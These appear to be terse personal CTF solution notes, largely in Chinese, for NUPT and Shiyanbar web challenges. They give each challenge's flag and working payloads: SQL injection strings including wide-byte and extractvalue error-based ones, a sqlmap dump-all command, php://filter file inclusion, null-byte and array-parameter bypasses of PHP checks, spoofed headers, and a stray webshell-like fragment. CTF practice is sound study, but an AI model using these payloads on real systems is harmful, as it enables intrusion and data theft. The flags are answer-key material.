http://ctf.nuptzj.cn/team/6247
三个老斯基来1发
19920211
{
WEB
1.送分题!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
50
查看源代码

2.MD5 collision!!!!!!!!!!!!!!!!!!!!!!!!!!!!
50
QNKCDZO==240610708
QNKCDZO
    240610708
    s878926199a
    s155964671a
    s214587387a
    s214587387a
     sha1(str)
    sha1('aaroZmOk')  
    sha1('aaK1STfY')
    sha1('aaO8zKZF')
    sha1('aa3OFF9m')
nctf{md5_collision_is_easy}

3.签到2 网络攻防大赛!!!!!!!!!!!!!!!!!!!!!
50
http://teamxlc.sinaapp.com/web1/02298884f0724c04293b4d8c0178615e/index.php
text1=zhimakaimen
nctf{follow_me_to_exploit}

4.这题不是WEB!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
100
查看图片数据
nctf{photo_can_also_hid3_msg}


5.层层递进!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
100
层层查看源代码
nctf{this-is_a_fl4g}

6.aaencode!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
ppencode/rrencode/jjencode/aaencode
js格式化，去掉eval，console中执行
https://tool.zcmzcm.org/aadecode
alert("nctf{javascript_aaencode}")

7.单身二十年!!!!!!!!!!!!!!!!!!
100
<script>window.location="./no_key_is_here_forever.php"; </script>
nctf{yougotit_script_now}

8.你从哪里来!!!!!!!!!!!!!!!!!!!!!!!!!!!!
100
Referer: http://google.com
nctf{http_referer}
74.117.178.147

9.phpdecode!!!!!!!!!!!!!!!!!
100
gzinflate,base64_decode,strlen,chr,ord
php C:\Users\tulu\Desktop\CTF\phpdecode.php
nctf{gzip_base64_hhhhhh}

10.文件包含!!!!!!!!!!!!!!!!!!!!
150
http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/read=convert.base64-encode/resource=index.php

<html>
    <title>asdf</title>   
<?php
	error_reporting(0);
	if(!$_GET[file]){echo '<a href="./index.php?file=show.php">click me? no</a>';}
	$file=$_GET['file'];
	if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data")){
		echo "Oh no!";
		exit();
	}
	include($file); 
//flag:nctf{edulcni_elif_lacol_si_siht}
?>
</html>

nctf{edulcni_elif_lacol_si_siht}

11.单身一百年也没用
response
flag: nctf{this_is_302_redirect}

12.????????????????????????????????????????download!!!!!!!!!!!!!

13.COOKIE
0==not
login=1
nctf{cookie_is_different_from_session}


14.MYSQL!!!!!!!!!!!!!!
200
robots.txt

sql.php
	<?php
	if($_GET[id]) {
	   mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
	  mysql_select_db(SAE_MYSQL_DB);
	  $id = intval($_GET[id]);
	  $query = @mysql_fetch_array(mysql_query("select content from ctf2 where id='$id'"));
	  if ($_GET[id]==1024) {
		  echo "<p>no! try again</p>";
	  }
	  else{
		echo($query[content]);
	  }
	}
	?>

chinalover.sinaapp.com/web11/sql.php?id=1024.1
nctf{query_in_mysql}


15.sql injection 3
200
	http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1
    Payload: id=%df' UNION ALL SELECT NULL,CONCAT(0x7178767171,0x4e49696a6566556a4d73,0x716a767671)#
	Payload: id=%df' AND 2369=BENCHMARK(5000000,MD5(0x78695172))#
	http://chinalover.sinaapp.com/SQL-GBK/index.php?id=%df' union all select NULL,database()%23
	sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1 --prefix="%df'" --suffix="%23" --dump-all

16./x00!!!!!!!!!!!!!!!!!!!!!!!!!!!!
200
题目有多种解法，你能想出来几种？
    if (isset ($_GET['nctf'])) {
        if (@ereg ("^[1-9]+$", $_GET['nctf']) === FALSE)
            echo '必须输入数字才行';
        else if (strpos ($_GET['nctf'], '#biubiubiu') !== FALSE)   
            die('Flag: '.$flag);
        else
            echo '骚年，继续努力吧啊~';
    }
ereg/strpos
http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?nctf=12345%00%23biubiubiu
http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?nctf[]=111
flag:nctf{use_00_to_jieduan}
17.bypass again!!!!!!!!!!!!!!!!!!!!!!!!!!!
200
if (isset($_GET['a']) and isset($_GET['b'])) {
if ($_GET['a'] != $_GET['b'])
if (md5($_GET['a']) === md5($_GET['b']))
die('Flag: '.$flag);
else
print 'Wrong.';
}
URL可以传递数组参数，形式是http://haha.com?x[]=1&x[]=2&x[]=3，这样就提交了一个x[]={1,2,3}的数组。
在PHP中，MD5是不能处理数组的，md5(数组)会返回null，所以md5(a[])==null,md5(b[])==null，md5(a[])=md5(b[])=null
http://chinalover.sinaapp.com/web17/index.php?a[]=1&b[]=2
Flag: nctf{php_is_so_cool}

18.变量覆盖
http://chinalover.sinaapp.com/web18/index.php
pass=1&thepassword_123=1
nctf{bian_liang_fu_gai!}


19.PHP是世界上最好的语言??????????????????????????????????????
250
<?php
if(eregi("hackerDJ",$_GET[id])) {
  echo("<p>not allowed!</p>");
  exit();
}

$_GET[id] = urldecode($_GET[id]);
if($_GET[id] == "hackerDJ")
{
  echo "<p>Access granted!</p>";
  echo "<p>flag: *****************} </p>";
}
?>
http://way.nuptzj.cn/php/index.php?id=%2568ackerDJ 
nctf{php_is_best_language}
20.伪装者
x-forwarded-for:127.0.0.1
nctf{happy_http_headers}


21.header


22.上传绕过
250
dir /uploads/1.php(0x00)1.jpg
nctf{welcome_to_hacks_world} 
);$R.=php_uname();$R.="({$usr})";print $R;;echo("|<-");die();


23.SQL注入1!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
300
http://chinalover.sinaapp.com/index.php
user=admin')/**/or/**/1=1%23&pass=11
nctf{ni_ye_hui_sql?}

24.pass check
300
<?php
	$pass=@$_POST['pass'];
	$pass1=***********;//被隐藏起来的密码
	if(isset($pass))
	{
	if(@!strcmp($pass,$pass1)){
	echo "flag:nctf{*}";
	}else{
	echo "the pass is wrong!";
	}
	}else{
	echo "please input pass!";
	}
?>
strcmp漏洞
echo (int)strcmp('pending',array());
will output -1 in PHP 5.2.16 (probably in all versions prior 5.3)
but will output 0 in PHP 5.3.3
构造数组绕过
http://chinalover.sinaapp.com/web21/
pass[]=1
nctf{strcmp_is_n0t_3afe}      

25.起名字真难
300
<?php
 function noother_says_correct($number)
{
        $one = ord('1');
        $nine = ord('9');
        for ($i = 0; $i < strlen($number); $i++)
        {   
                $digit = ord($number{$i});
                if ( ($digit >= $one) && ($digit <= $nine) )
                {
                        return false;
                }
        }
           return $number == '54975581388';
}
$flag='*******';
if(noother_says_correct($_GET['key']))
    echo $flag;
else 
    echo 'access denied';
?>
chinalover.sinaapp.com/web12/index.php?key=0xccccccccc
nctf{follow_your_dream}
}
实验吧CTF
{
	1.加了料的报错注入
		http://www.shiyanbar.com/ctf/2011
		bool型注入、报错注入，过滤=，information_schema注入，group_concat\length\extractvalue
		$sql="select * from users where username='$username' and password='$password'"
		model ="1' or !(length((select group_concat(table_name) from information_schema.tables where !(table_schema<>database())))<>%d) or '"
		model ="1' or !(length((select group_concat(column_name) from information_schema.columns where !(table_name<>'ffll44jj')))<>%d) or '"
		model = "1' or (select group_concat(column_name) from information_schema.columns where !(table_name<>'ffll44jj')) regexp '^%s' or '"
		#username=1' or extractvalue/*&password=*/(1,concat(0x23,database())) or '
		#username=1' or extractvalue/*&password=*/(1,concat(0x23,(select group_concat(table_name) from information_schema.tables where table_schema regexp database()))) or '
		#username=1' or extractvalue/*&password=*/(1,concat(0x23,(select group_concat(column_name) from information_schema.columns where table_name regexp 'ffll44jj'))) or '
		#username=1' or extractvalue/*&password=*/(1,concat(0x23,(select value from ffll44jj))) or '
	2.认真一点！分值：35
		 http://ctf5.shiyanbar.com/web/earnest/index.php 
}